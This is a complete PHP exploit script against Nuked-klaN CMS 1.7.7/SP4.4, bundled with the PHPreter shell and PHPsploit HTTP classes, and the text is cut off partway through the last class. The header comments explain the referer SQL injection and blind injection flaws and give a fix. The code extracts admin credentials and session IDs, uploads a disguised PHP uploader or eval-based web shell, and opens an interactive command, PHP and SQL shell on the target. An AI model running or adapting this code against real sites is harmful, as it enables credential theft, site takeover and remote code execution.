<?php
#
# Name:    Nuked-klaN <= 1.7.7 and <= SP4.4 Multiples Vulnerabilities Exploit
# Credits: Charles FOL <charlesfol[at]hotmail.fr>
# URL:     http://real.o-n.fr/
# Date:    14/10/2008
#
# Special thanks to Louis for remembering me I had to finish it =)
#
# VULNERABILITY DETAILS
# ---------------------
#
# Nuked-klaN suffers from a vulnerability due to HTTP_REFERER, which is not
# correctly  filtered  before being inserted in  nuked_stats_visitor table.
#
# If HTTP headers are not addslashes()'d by PHP,  it could lead to a INSERT
# SQL injection.
#
# In function view_referer() (visits.php),  referers are extracted from the 
# database to perform an other SQL query, without being secured in between.
# This leads to a blind SQL injection.
#
# Theses injections are  only possible if Nuked-klaN (NK) considers us as a
# new user, because else it won't touch the nuked_stats_visitor table.
# For this,  we can use X-Forwarded-For HTTP header to specify NK a new IP,
# to be considered as a new user, and therefore access the database.
# NK automaticaly tries to resolve our host (using gethostbyaddr()), and it
# could be very long if the IP is not corresponding to a real one,  because
# the default timeout is ~3 seconds, and that's very unconvenient for blind
# SQL injection.
# In order to solve this,  we can try to  generate IPs that might be valid,
# using, for example, a known BASE (the first two numbers), and randomizing
# the two other numbers.
#
# Stats can be disabled, or not accessible for users or visitors.
# In the last case we can't get query results,  so the unique way to inject
# is BENCHMARK method, but this implies that the headers are not addslashed
# by PHP, but this method is not implemented in this exploit.
#
# If we got an admin session or login, we can spawn a remote shell/uploader
# using the NK "MySQL administration",  but PHP safe_mode must be disabled.
#
# This exploit uses  all these vulnerabilities to spawn a shell/uploader or
# to simply obtain admin credentials.
#
# EXPLOIT MAP
# -----------
#
# (ERRORS ARE THIS WAY ->)
# 
# +---------------------------+
# | Check stats accessibility |->exit()
# +---------------------------+
#   |
#   |  +---------------------------------+  +-----------------------------------------------+
#   +->| Spoof referer to corrupt INSERT |->| Spoof referer to corrupt view_referer() query |->exit()
#      | query and look for results      |  | (blind sql injection)                         |
#      +---------------------------------+  +-----------------------------------------------+
#        |                                    |
#        |  +--------------------------+      | +---------------------------------------------+
#        +->| Did we find an admin SID |<-----+ | We only have a login and a hashed password, |
#           | or not ?                 |------->| we have to crack it and use -admin          |
#           +--------------------------+        +---------------------------------------------+
#             |
#             |  +-------------------------------------------------+
#             +->| Login as admin and spawn an uploader or a shell |
#                | using "MySQL administration"                    |
#                +-------------------------------------------------+
#
# SOLUTION
# --------
# The best way to secure your Nuked-klaN is disabling stats using the admin
# panel.
# If you wan't to keep stats activated, you have to addslashes HTTP_REFERER
# in nuked.php and in visits.php.
#
#
# THIS IS FOR EDUCATION PURPOSES ONLY, as usual.
#

define('MSG_INFO', 1);
define('MSG_OKAY', 2);
define('MSG_ERROR', 3);
define('MSG_QUESTION', 4);

define('AGENT', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16');
define('IPBASE', '82.237.');

define('UPCODE', '<?php if(isset($_SERVER[\'HTTP_SHELL\'])) {$h=fopen(\'w00t.php\', \'w+\');if(!$h || fputs($h, \'<file>\')) exit(\'--NOTDONE--\');fclose($h);exit(\'--DONE--\');}else{include(\'./Includes/blocks/block_login.php\');$blok[type]=\'login\';} ?>');
define('SHCODE', '<?php if(isset($_SERVER[\'HTTP_SHELL\'])) {print 123456789;eval($_SERVER[\'HTTP_SHELL\']);print 123456789;exit();}else{include(\'./Includes/blocks/block_login.php\');$blok[type]=\'login\';} ?>');

$nk = new nk();

class nk
{
	var $proxy;
	
	var $user;
	var $admin;
	var $suser;
	var $sadmin;
	var $mode;
	var $url;
	var $year;
	
	var $ips = array();
	var $queries;
	var $www;
	
	function nk()
	{
		$this->header();
		$this->usage();
		
		$this->setParameters();
		$this->controlParameters();
		
		$this->main();
	}
	
	# Main function, what and when.
	function main()
	{
		# Admin login not specified
		if(!$this->sadmin)
		{
			$this->setQueries(0);
			$this->checkStatsAccessibility();
			$this->sendInsertQuery();
		
			# Got the credentials =)
			if($this->getCredentials())
			{
				$this->dumpCredentials();
			}
			elseif($this->blindQueries())
			{
				if($this->mode != 2 && !$this->admin['sid'])
				{
					$this->msg('There is no active admin session, try with "-mode 2"', MSG_ERROR);
					exit();
				}
				
				$this->file = str_replace('$_SERVER[\'HTTP_SHELL\']', 'stripslashes($_SERVER[\'HTTP_SHELL\'])', $this->file);
			}
			# No attack worked
			else
			{
				$this->msg('Exploit failed, stats might be disabled.', MSG_ERROR);
				exit();
			}
		}
		
		$this->makeadmin();
		$this->conclude();
	}
	
	# Define queries in function of the current mode
	function setQueries($mode)
	{
		$this->queries   = array();
		
		if(!$mode)
		{
			# User queries
			$this->queries['name']     = 'SELECT pseudo FROM <prefix>users WHERE niveau=9 ORDER BY DATE ASC LIMIT 1';
			$this->queries['password'] = 'SELECT pass FROM <prefix>users WHERE niveau=9 ORDER BY DATE ASC LIMIT 1';
			
			# Session queries
			if($this->mode != 2)
			{
				$this->queries['uid'] = 'SELECT id FROM <prefix>users WHERE niveau=9 ORDER BY DATE ASC LIMIT 1';
				$this->queries['sid'] = 'SELECT id FROM <prefix>sessions WHERE user_id=(SELECT id FROM <prefix>users WHERE niveau=9 ORDER BY DATE ASC LIMIT 1) ORDER BY DATE DESC LIMIT 1';
			}
		}
		else
		{
			list($day, $month, $year) = explode(':', date('d:m:Y'));
			$this->queries[] = 'ALTER TABLE <prefix>block CHANGE `type` `type` VARCHAR(60) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL DEFAULT 0;';
			$this->queries[] = 'UPDATE <prefix>block SET type=0x2f2e2e2f2e2e2f2e2e2f<filename>00 WHERE type=0x6c6f67696e OR type LIKE 0x252f2e2e25 AND active!=0 LIMIT 1;';
			$this->queries[] = 'DELETE FROM <prefix>stats_visitor WHERE (day=' . $day . ' AND month=' . $month . ' AND year=' . $year . ') OR year=' . $this->year . ' OR year=0;';
		}
		
		# Set the SQL prefix
		foreach($this->queries as $k => $v)
			$this->queries[$k] = str_replace('<prefix>', $this->sprefix, $v);
	}
	
	# Informs of the stats accessibility
	function checkStatsAccessibility()
	{
		$this->msg('Checking statistics accessibility ...', MSG_INFO, false);
		
		$accessibility = $this->areStatsReachable();
		
		if($accessibility == 1)
		{
			$this->msg('Statistics are reachable, but require authentification', MSG_OKAY);
			
			if(!$this->suser)
			{
				$this->msg('Please create an user and specify it using -user parameter', MSG_ERROR);
				exit();
			}
			else
			{
				$this->makeuser();
			}
		}
		elseif($accessibility == 0)
		{
			$this->msg('Statistics are reachable as a visitor', MSG_OKAY);
		}
		else
		{
			$this->msg('Statistics are NOT reachable or activated', MSG_ERROR);
			exit();
		}
	}
		
	# Determine if stats are accessible, and under which conditions
	function areStatsReachable()
	{
		$this->wwwinit(0);
		$this->www->addheader('Referer', 'http://test.com/');
		$this->www->get($this->url . 'index.php?file=Stats&nuked_nude=visits&op=view_referer');
		
		if(preg_match('#<a href="javascript:history.back\(\)"><b>[^<]+</b>#i', $this->www->getcontent()))
			return -1;
		if(preg_match('#<a href="index.php\?file=User&amp;op=login_screen">[^<]+</a>#i', $this->www->getcontent()))
			return 1;
			
		if(!preg_match('#http://test\.com/#i', $this->www->getcontent()))
			return -1;
		
		return 0;
	}
	
	# Send the spoofed referer in order to insert interresting
	# informations in the nuked_stats_visitors table
	function sendInsertQuery()
	{
		$time = time()+60;
		
		$this->msg('Sending INSERT query ...', MSG_INFO, false);
		
		# End the first row
		$sql  = "http://google.com/', '', '', '', '', '0'), ";
		
		# For each query, a new row
		foreach($this->queries as $key => $query)
		{
			$sql .= "('', '', '0.0.0.0', 'attack', 'Mozilla', 'Windows', CONCAT('<!--:$key:', ($query), ':-->'), '1', '1', '" .$this->year . "', '1', '$time'), ";
		}
		
		# End this with the beginning of a row, to have a valid SQL query
		$sql .= "('', '', '', '', '', '', '";
		
		# Let's send it
		$this->wwwinit(0);
		$this->www->addheader('Referer', $sql);
		$this->www->get($this->url);
		
		$this->msg('Sent INSERT query       ', MSG_OKAY);
	}
	
	# Get insert query result in stats page, credentials
	function getCredentials()
	{
		$this->admin = array();
		
		$this->msg('Retrieving credentials ...', MSG_INFO, false);
		
		$this->wwwinit(1);
		$this->www->get($this->url . 'index.php?file=Stats&nuked_nude=visits&op=view_referer&oyear=' . $this->year);
		
		if(!preg_match_all('#<!--:([^ :]+):([^ ]*):-->#Ui', $this->www->getcontent(), $data))
		{
			$this->msg('Unable to reach credentials', MSG_ERROR);
			return false;
		}
		
		for($i=0;$i<sizeof($data[0]);$i++)
		{
			$this->admin[$data[1][$i]] = $data[2][$i];
		}
			
		$this->msg('Got the credentials =)    ', MSG_OKAY);
		
		return true;
	}
	
	# Dump $this->user content
	function dumpCredentials()
	{
		$display = array
		(
			'User      : ' => 'name',
			'Password  : ' => 'password',
			'UserID    : ' => 'uid',
			'SessionID : ' => 'sid',
		);
		
		foreach($display as $key => $value)
			if($this->admin[$value])
				$this->msg($key . $this->admin[$value], MSG_OKAY);
	}
	
	# Here we are on the second attack: we have to blind, but only
	# critical information because it's pretty long
	function blindQueries()
	{
		$this->msg('Switching to blind mode, be (very) patient ...', MSG_INFO);
		
		if($this->mode != 2)
		{
			unset($this->queries['name']);
			unset($this->queries['password']);
		}
		
		foreach($this->queries as $key => $query)
		{
			$length = $key == 'password' ? 32 : 20;
			
			if($key == 'sid')
			{
				$query = str_replace
				(
					'(' . $this->queries['uid'] . ')',
					"'" . $this->admin['uid'] . "'",
					$query
				);
			}
				
			switch($key)
			{
				case 'name':     $display = 'User      : '; break;
				case 'password': $display = 'Password  : '; break;
				case 'sid':      $display = 'SessionID : '; break;
				case 'uid':      $display = 'UserID    : '; break;
			}
			
			$this->msg($display, MSG_QUESTION, false);
			if(!($this->admin[$key] = $this->blind($query, $length))) return true;
			$this->msg($display . $this->admin[$key], MSG_OKAY);
		}
		
		return true;
	}
	
	# SQL Blind function
	# Referer SQL field only supports 200 characters,
	# so we use a special sql injection to be sure it
	# will work fine and fast enought.
	#
	# 1. Charset
	# 2. Dichotomy
	#
	function blind($query, $nbchars)
	{
		$result  = '';
		
		for($p=1;$p<=$nbchars;$p++)
		{
			$letter = '';
			$sql    = "MID(($query),$p,1)";
			
			if($this->blind_is($sql))
			{
				if($this->blind_isChar($sql))
				{		
					if($this->blind_isMaj($sql))
						$charset = array(ord('A'), ord('Z'));
					else
						$charset = array(ord('a'), ord('z'));
				}
				else
					$charset = array(ord('0'), ord('9'));
			}
			else
				break;
				
			$add = $charset[0];
			
			for($pos=$charset[1]-$charset[0];$pos>2;$pos=intval($pos/2+0.5))
			{
				$s = 'ORD(' . $sql . ') BETWEEN ' . $add . ' AND ' . ($add+$pos);
				if(!$this->blind_test($s)) $add += $pos;
			}
			
			$letter = '';
			
			for($i=$add;$i<=$add+$pos+1;$i++)
			{
				$s = 'ORD(' . $sql . ')=' . $i;
				if($this->blind_test($s))
				{
					$letter = chr($i);
					break;
				}
			}
			
			$result .= $letter;
			print $letter;
		}
		
		return $result;
	}
	
	function blind_is($sql)
	{
		return $this->blind_test("ORD($sql)!=0");
	}
	
	function blind_isChar($query)
	{
		return $this->blind_test("UPPER($query) BETWEEN 'A' AND 'Z'");
	}
	
	function blind_isMaj($query)
	{
		return $this->blind_test("ORD($query) BETWEEN 65 AND 90");
	}
	
	# Return true or false depending on the page result, before
	# setting up PHPsploit and the referer
	function blind_test($sql)
	{
		$site = $this->generateIP();
		$when = '&oday=' . date('d') . '&omonth=' . date('m') . '&oyear=' . date('Y');
		
		$this->wwwinit(0);
		$this->www->addheader('Referer', $this->year . $site . "' OR 1=1 AND $sql AND 'A'='A");
		
		# If we have to be user to reach stats
		if(sizeof($this->user))
		{
			$this->www->get($this->url . 'index.php');
			$this->wwwinit(1);
		}
			
		$this->www->get($this->url . 'index.php?file=Stats&nuked_nude=visits&op=view_referer' . $when);
		
		if(preg_match('#' . $this->year . $site . '[^<]+</a></td>\s+<td style="width: 20%;" align="center">([0-9]*)#i', $this->www->getcontent(), $data))
		{
			if($data[1] > 0)
				return true;
		}
		else
		{
			$this->msg('Error while blinding.', MSG_ERROR);
			exit();
		}
	}
		
	# Set up the admin
	function makeadmin()
	{
		# The current user is now the admin
		$this->user = $this->admin;
		
		# Determine if we have a session or just a name
		if($this->mode == 2)
		{
			exit();
		}
		elseif($this->sadmin)
		{
			$this->suser = $this->sadmin;
			$this->makeuser();
		}
		elseif($this->user['sid'] && $this->user['uid'])
		{
			$this->msg('Got a session, no login required', MSG_OKAY);
		}
		elseif($this->user['name'] && $this->user['password'])
		{
			$this->msg('Please crack the admin hash, and use -admin parameter', MSG_ERROR);
			exit();
		}
		else
		{
			$this->msg('How did you get there ?', MSG_ERROR);
			exit();
		}
		
		$this->user['aid'] = $this->user['uid'];
		$this->user['ip']  = '127.0.0.1';
		
		$this->msg('Administrator status OK =)', MSG_OKAY);
	}
	
	# Conclude the attack: spawn a shell or an uploader
	function conclude()
	{
		# Initialise PHPsploit for the last time
		$this->wwwinit(1);
		$this->www->addheader('Referer', $this->url);
		
		# Actualize the queries
		$this->setQueries(1);
		
		$this->uploadavatar();
		$this->sendqueries();
		$this->loadshell();
	}
	
	function uploadavatar()
	{
		$this->msg('Uploading avatar ...', MSG_INFO, false);
		
		$fmdt = array
		(
			'frmdt_url'   => $this->url . 'index.php?file=User&op=update_pref',
			'fichiernom'  => array
							(
								'frmdt_filename' => 'one.jpg',
								'frmdt_content'  => $this->file,
							)
		);

		$this->www->formdata($fmdt);
		$this->www->get($this->url . 'index.php?file=User&op=edit_pref');
		
		if(!preg_match('#value="([^"]+\.jpg)"#U', $this->www->getcontent(), $match))
		{
			$this->msg('Error while uploading avatar', MSG_ERROR);
			exit();
		}
		
		$this->msg('Avatar successfully uploaded (' . basename($match[1]) . ')', MSG_OKAY);
		
		$match = unpack('H*', $match[1]);
		
		$this->queries[1] = str_replace('<filename>', $match[1], $this->queries[1]);
	}
	
	function sendqueries()
	{
		$this->msg('Sending SQL queries ', MSG_INFO, false);
		
		foreach($this->queries as $query)
		{
			$this->www->post($this->url . 'index.php?file=Admin&page=mysql&op=upgrade_db', 'upgrade=' . $query);
			$this->msg('.', 0, false);
		}
		
		$this->msg('SQL queries sent        ', MSG_OKAY);
	}
	
	function loadshell()
	{
		if($this->mode == 0)
		{
			$this->www->addheader('Shell', '1');
			$this->www->get($this->url);
			
			if(strpos('--DONE--', $this->www->getcontent()))
				$this->msg('File created. URL: ' . $this->url . 'w00t.php', MSG_OKAY);
			else
			{
				# possible causes: safe_mode, open_basedir, file restrictions ...
				$this->msg('File was not created', MSG_ERROR);
			}
		}
		else
		{
			$this->msg('Shell spawned', MSG_OKAY);
			$this->msg();
			$sql = array('conf.inc.php', '$global[\'db_host\']', '$global[\'db_user\']', '$global[\'db_password\']', '$global[\'db_name\']');
			new phpreter($this->url . 'index.php', '123456789(.*)123456789', 'cmd', $sql, false);
		}
	}
	
	# Login as a specified user, and obtain a $uid and a $sid
	function createSession($user, $passwd, &$uid, &$sid)
	{
		$this->wwwinit(0);
		$this->www->addheader('Referer', $this->url . 'index.php');
		$this->www->post($this->url . 'index.php?file=User&nuked_nude=index&op=login', "pseudo=$user&pass=$passwd&remember_me=ok");
		
		preg_match('#nuked_sess_id=([a-z0-9]+)#i', $this->www->getheader(), $sid);
		preg_match('#uid=([a-z0-9]+)#i', $this->www->getcontent(), $uid);
		
		$sid = $sid[1];
		$uid = $uid[1];
		
		if($uid && $sid)
			return true;
		
		return false;
	}
	
	# Login user and set his informations
	function makeuser()
	{	
		list($user, $passwd) = explode(':', $this->suser);
		
		$this->user = array();
		
		$this->msg('Logging in as ' . $user, MSG_INFO, false);
		
		if($this->createSession($user, $passwd, $uid, $sid))
		{
			$this->user['name']     = $user;
			$this->user['password'] = $passwd;
			$this->user['uid']      = $uid;
			$this->user['sid']      = $sid;
			$this->user['ip']       = $this->generateIP();
			
			$this->msg('Loggued in as ' . $user . ' (uid=' . $uid . ')', MSG_OKAY);
		}
		else
		{
			$this->msg('Unable to log in as ' . $user, MSG_ERROR);
			exit();
		}
	}
	
	# Initialize PHPsploit (with a new identity)
	function wwwinit($mode)
	{	
		$this->www->reset();
		$this->www->agent(AGENT);
		
		if($mode && sizeof($this->user))
			$this->wwwuser();
		else
			$this->www->addheader('X-Forwarded-For', $this->generateIP());
	}

	# Set user cookies and headers
	function wwwuser()
	{	
		$cookies = array();
		
		if($this->user['uid']) $cookies['user_id']       = $this->user['uid'];
		if($this->user['sid']) $cookies['sess_id']       = $this->user['sid'];	
		if($this->user['aid']) $cookies['admin_session'] = $this->user['aid'];
			
		foreach($cookies as $k => $v)
			$this->www->addcookie($this->cprefix . $k, $v);
		
		// yes it's not a cookie
		$this->www->addheader('X-Forwarded-For', $this->user['ip']);
	}
	
	# Make an IP which can be gethostbyaddr()'ed, for speed
	# reasons
	function generateIP()
	{
		do
		{
			$ip = IPBASE . rand(1, 20) . '.' . rand(1, 250);
		}
		while(in_array($ip, $this->ips));
		
		$this->ips[] = $ip;
		
		return $ip;
	}
	
	function msg($msg = '', $type = 0, $n = true)
	{
		$display = $n ? "\r" : '';

		switch($type)
		{
			case MSG_INFO:     $display .= '[*] '; break;
			case MSG_OKAY:     $display .= '[+] '; break;
			case MSG_ERROR:    $display .= '[-] '; break;
			case MSG_QUESTION: $display .= '[?] '; break;
		}

		$display .= $msg;

		$display .= $n ? "\n" : '';

		if($this->export)
				$this->export .= $display;

		print $display;
	}
	
	function header()
	{
		$this->msg();
		$this->msg('   Nuked-klaN 1.7.7 and SP4.4 Multiple Vulnerabilities Exploit');
		$this->msg('     by Charles FOL <charlesfol[at]hotmail.fr>');
		$this->msg();
	}
	
	function usage()
	{
		global $argc;
		
		if($argc<3)
		{
			$this->msg(' usage: ./nk_exploit.php -url <url> [options]');
			$this->msg();
			$this->msg(' Options: -mode    0: Remote Upload (default)');
			$this->msg('                   1: Remote Code Execution');
			$this->msg('                   2: Admin Hash Extraction');
			$this->msg('          -admin   If you have an admin account.');
			$this->msg('          -user    If stats page need registration.');
			$this->msg('          -proxy   If you want to use a proxy.');
			$this->msg('          -cprefix Cookie prefix (default: nuked_).');
			$this->msg('          -sprefix SQL prefix (default: nuked_).');
			$this->msg('          -file    If you wanna upload a specific file');
			$this->msg('                   else it will upload a simple uploader.');
			$this->msg();
			$this->msg(' eg: ./nk_exploit.php -url http://localhost/nk/ -admin real:passw0rd');
			$this->msg(' eg: ./nk_exploit.php -url http://localhost/nk/ -file cshell.php -proxy localhost:8118');
			
			$this->close();
		}
	}
	
	function setParameters()
	{
		$this->www     = new phpsploit();
		$this->year    = rand(1000, 1500);
		$this->url     = $this->getParameter('url', true);
		$this->mode    = $this->getParameter('mode', false, 0);
		$this->suser   = $this->getParameter('user', false);
		$this->sadmin  = $this->getParameter('admin', false);
		$this->proxy   = $this->getParameter('proxy', false);
		$this->cprefix = $this->getParameter('cprefix', false, 'nuked_');
		$this->sprefix = $this->getParameter('sprefix', false, 'nuked_');
		$this->file    = $this->getParameter('file', false);
	}
	
	function controlParameters()
	{
		if($this->mode == 0)
		{
			if($this->file)
				$this->file = file_get_contents($this->file);
			else
				$this->file = '<?php if(isset($_GET[\'del\'])){unlink(basename($_SERVER[\'PHP_SELF\']));exit();} if'
				            . '(isset($_POST[\'upload\'])){if(!move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], '
				            . '"./".$_FILES[\'file\'][\'name\'])) echo("<center>Error ".$_FILES[\'file\'][\'error\''
				            . ']."</center>");else echo "<center>File uploaded</center>"; } ?><form method="post" e'
				            . 'nctype="multipart/form-data"><center><input type="file" name="file"><input type="sub'
				            . 'mit" name="upload" value="Upload"></center></form>';

			$this->file = str_replace('<file>', str_replace("'", "\'", $this->file), UPCODE);
		}
		else
			$this->file = SHCODE;
		
		if($this->proxy)
			$this->www->proxy($this->proxy);
	}
	
	function getParameter($parameter, $required = false, $default = '')
	{
		global $argv, $argc;
		
		for($i=0;$i<$argc;$i++)
		{
			if($argv[$i] == '-' . $parameter)
				return $argv[$i+1];
		}
		
		if($required)
		{
			$this->msg('-' . $parameter . ' parameter is required.', MSG_ERROR);
			$this->close();
		}
		
		return $default;
	}
}

# PHPreter (a bit modified).
# Find original version on http://real.o-n.fr/

/*
 * Copyright (c) Charles FOL
 *
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 *
 * TITLE:          PHPreter
 * AUTHOR:         Charles FOL <charlesfol[at]hotmail.fr>
 * VERSION:        1.0
 * LICENSE:        GNU General Public License
 *
 * This is a really simple class with permits to exec SQL, PHP or CMD
 * on a remote host using the HTTP "Shell" header.
 *
 *
 * Sample code:
 * [host][sql]# mode=cmd
 * [host][cmd]# id
 * uid=2176(u47170584) gid=600(ftpusers)
 * 
 * [host][cmd]# mode=php
 * [host][php]# echo phpversion();
 * 4.4.8
 * [host][php]# mode=sql
 * [host][sql]# SELECT version(), user()
 * --------------------------------------------------
 *  version()           | 5.0.51a-log
 *  user()              | dbo225004932@74.208.16.148
 * --------------------------------------------------
 * 
 * [host][sql]#
 *
 */

class phpreter
{
	var $url;
	var $host;
	var $port;
	var $page;
	
	var $mode;
	
	var $ssql;
	
	var $prompt;
	var $phost;
	
	var $regex;
	var $data;
	
	/**
	 * __construct()
	 *
	 * @param url      The url of the remote shell.
	 * @param regexp   The regex to catch cmd result.
	 * @param mode     Mode: php, sql or cmd.
	 * @param sql      An array with the file to include,
	 *                 and sql vars
	 * @param clear    Determines if clear() is called
	 *                 on startup
	 */
	function phpreter($url, $regexp='^(.*)$', $mode='cmd', $sql=array(), $clear=true)
	{
		$this->url = $url;
		
		$this->regex = '#'.$regexp.'#is';
		
		#
		# Set data
		#
		
		$infos         =	parse_url($this->url);
		$this->host    =	$infos['host'];
		$this->port    =	isset($infos['port']) ? $infos['port'] : 80;
		$this->page    =	$infos['path'];
		
		# www.(site).com
		$host_tmp      =	explode('.',$this->host);
		$this->phost   =	$host_tmp[ count($host_tmp)-2 ];
		
		#
		# Set up MySQL connection string
		#
		if(!sizeof($sql))
			$this->ssql = '';
		elseif(sizeof($sql) == 5)
		{
			$this->ssql = "include('$sql[0]');"
			            . "mysql_connect($sql[1], $sql[2], $sql[3]);"
			            . "mysql_select_db($sql[4]);";
		}
		else
		{
			$this->ssql = ""
			            . "mysql_connect('$sql[0]', '$sql[1]', '$sql[2]');"
			            . "mysql_select_db('$sql[3]');";
		}
		
		$this->setmode($mode);
		
		#
		# Main Loop
		#

		if($clear) $this->clear();
		print $this->prompt;

		while( !preg_match('#^(quit|exit|close)$#i', ($cmd = trim(fgets(STDIN)))) )
		{
			# change mode
			if(preg_match('#^(set )?mode(=| )(sql|cmd|php)$#i',$cmd,$array))
				$this->setmode($array[3]);
			
			# clear data
			elseif(preg_match('#^clear$#i',$cmd))
				$this->clear();
			
			# else
			else print $this->exec($cmd);
			
			print $this->prompt;
		}
	}
	
	/**
	 * clear()
	 * Just clears ouput, printing '\n'x50
	 */
	function clear()
	{
		print str_repeat("\n", 50);
		return 0;
	}
	
	/**
	 * setmode()
	 * Set mode (PHP, CMD, SQL)
	 * You don't have to call it.
	 * use mode=[php|cmd|sql] instead,
	 * in the prompt.
	 */
	function setmode($newmode)
	{
		$this->mode = strtolower($newmode);
		$this->prompt = '['.$this->phost.']['.$this->mode.']# ';
		
		switch($this->mode)
		{
			case 'cmd':
				$this->data = 'system(\'<CMD>\');';
				break;
			case 'php':
				$this->data = '';
				break;
			case 'sql':
				$this->data = $this->ssql
				            . '$q = mysql_query(\'<CMD>\') or print(str_repeat("-",50)."\n".mysql_error()."\n");'
				            . 'print str_repeat("-",50)."\n";'
				            . 'while($r=mysql_fetch_array($q,MYSQL_ASSOC))'
				            . '{'
				            .    'foreach($r as $k=>$v) print " ".$k.str_repeat(" ", (20-strlen($k)))."| $v\n";'
				            .    'print str_repeat("-",50)."\n";'
				            . '}';
				break;
		}
		return $this->mode;
	}

	/**
	 * exec()
	 * Execute any query and catch the result.
	 * You don't have to call it.
	 */
	function exec($cmd)
	{
		if(!strlen($this->data))	$shell = $cmd;
		else                    	$shell = str_replace('<CMD>', addslashes($cmd), $this->data);
		
		$fp = fsockopen($this->host, $this->port, $errno, $errstr, 30);
		
		$req  = "GET " . $this->page . " HTTP/1.1\r\n";
		$req .= "Host: " . $this->host . ( $this->port!=80 ? ':'.$this->port : '' ) . "\r\n";
		$req .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14\r\n";
		$req .= "X-Forwarded-For: 127.0.0.1\r\n"; // here is the mod.
		$req .= "Shell: $shell\r\n";
		$req .= "Connection: close\r\n\r\n";

		fputs($fp, $req);
		
		$content = '';
		while(!feof($fp)) $content .= fgets($fp, 128);
		
		fclose($fp);
		
		# Remove headers
		$data    = explode("\r\n\r\n", $content);
		$headers = array_shift($data);
		$content = implode("\r\n\r\n", $data);
		
		if(preg_match("#Transfer-Encoding:.*chunked#i", $headers))
			$content = $this->unchunk($content);
	
		preg_match($this->regex, $content, $data);
		
		if($data[1][ strlen($data)-1 ] != "\n") $data[1] .= "\n";
		
		return $data[1];
	}
	
	/**
	 * unchunk()
	 * This function aims to remove chunked content's sizes which
	 * are put by the apache server when it uses chunked
	 * transfert-encoding.
	 */
	function unchunk($data)
	{
		$dsize  = 1;
		$offset = 0;
		
		while($dsize>0)
		{
			$hsize_size = strpos($data, "\r\n", $offset) - $offset;
			
			$dsize = hexdec(substr($data, $offset, $hsize_size));
			
			# Remove $hsize\r\n from $data
			$data = substr($data, 0, $offset) . substr($data, ($offset + $hsize_size + 2) );
			
			$offset += $dsize;
			
			# Remove the \r\n before the next $hsize
			$data = substr($data, 0, $offset) . substr($data, ($offset+2) );
		}
		
		return $data;
	}
}

# PHPsploitClass

/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 4 / PHP 5
 * VERSION:        2.0
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 *
 * [2007-06-10] (2.0)
 *  * Code: Code optimization
 *  * New: Compatible with PHP 4 by default
 *
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit
{
	var $proxyhost;
	var $proxyport;
	var $host;
	var $path;
	var $port;
	var $method;
	var $url;
	var $packet;
	var $proxyuser;
	var $proxypass;
	var $header;
	var $cookie;
	var $data;
	var $boundary;
	var $allowredirection;
	var $last_redirection;
	var $cookiejar;
	var $recv;
	var $cookie_str;
	var $header_str;
	var $server_content;
	var $server_header;
	

	/**
	 * This function is called by the
	 * get()/post()/formdata() functions.
	 * You don't have to call it, this is
	 * the main function.
	 *
	 * @access private
	 * @return string $this->recv ServerResponse
	 * 
	 */
	function sock()
	{
		if(!empty($this->proxyhost) && !empty($this->proxyport))
		   $socket = @fsockopen($this->proxyhost,$this->proxyport);
		else
		   $socket = @fsockopen($this->host,$this->port);
		
		if(!$socket)
		   die("Error: Host seems down");
		
		if($this->method=='get')
		   $this->packet = 'GET '.$this->url." HTTP/1.1\r\n";
		   
		elseif($this->method=='post' or $this->method=='formdata')
		   $this->packet = 'POST '.$this->url." HTTP/1.1\r\n";
		   
		else
		   die("Error: Invalid method");
		
		if(!empty($this->proxyuser))
		   $this->packet .= 'Proxy-Authorization: Basic '.base64_encode($this->proxyuser.':'.$this->proxypass)."\r\n";
		
		if(!empty($this->header))
		   $this->packet .= $this->showheader();
		   
		if(!empty($this->cookie))
		   $this->packet .= 'Cookie: '.$this->showcookie()."\r\n";
	
		$this->packet .= 'Host: '.$this->host."\r\n";
		$this->packet .= "Connection: Close\r\n";
		
		if($this->method=='post')
		{
			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
